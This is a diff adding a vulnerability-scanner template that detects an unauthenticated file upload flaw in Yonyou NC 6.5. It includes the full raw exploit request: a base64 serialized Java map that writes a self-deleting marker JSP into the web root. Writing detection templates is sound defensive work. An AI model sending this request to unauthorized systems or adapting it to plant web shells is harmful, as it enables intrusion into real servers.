@@ -1,0 +1,30 @@
+id: yonyou-nc-fileupload
+
+info:
+  name: Yonyou NC 6.5 FileReceiveServlet File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload,rce
+  reference:
+    - https://mp.weixin.qq.com/s/_dpnfY7EVR3lRIfZMoytWg
+  description: |
+    Yonyou NC6.5 FileReceiveServlet has an arbitrary file upload vulnerability. An unauthenticated attacker can exploit this vulnerability to upload arbitrary files on the target system and execute command and control server privileges.
+
+http:
+  - raw:
+      - |
+        POST /servlet/FileReceiveServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+        Content-Length: 268
+
+        rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAJRklMRV9OQU1FdAAkOTFmOWVkYWZhNjIyNzY4ZGViNTA2Mjg0NGQ5N2ZmNmMuanNwdAAQVEFSR0VUX0ZJTEVfUEFUSHQAEC4vd2ViYXBwcy9uY193ZWJ4PCUNCm91dC5wcmludGxuKG5ldyBTdHJpbmcobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIoIlpURTJOVFF5TVRFeE1HSmhNRE13T1RsaE1XTXdNemt6TXpjell6VmlORE09IikpKTsNCm5ldyBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7DQolPg==
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "e165421110ba03099a1c0393373c5b43"
